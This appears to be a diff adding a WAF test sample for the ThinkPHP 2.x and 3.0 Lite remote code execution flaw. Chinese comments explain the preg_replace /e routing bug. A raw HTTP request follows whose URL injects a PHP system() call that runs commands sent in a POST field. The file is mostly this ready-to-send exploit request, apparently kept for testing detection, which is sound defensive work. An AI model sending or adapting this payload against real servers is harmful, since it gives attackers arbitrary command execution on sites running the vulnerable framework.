@@ -1,0 +1,13 @@
+# ThinkPHP2.x远程代码执行漏洞
+# ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：
+# $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
+# 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。
+# 
+# ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
+GET /index.php?acid=80046370&s=%2Findex%2Findex%2Fxxx%2F$%7B@print%28system%28$_POST%5Ba%5D%29%29%7D&bid=hd_tag_m8mv25zs HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zs
+RM-PRO-Token: 1e172445cda029ac62d71f5e972415ad
+RM-PRO-Time: 1742808517661
+User-Agent: curl/7.83.1
+
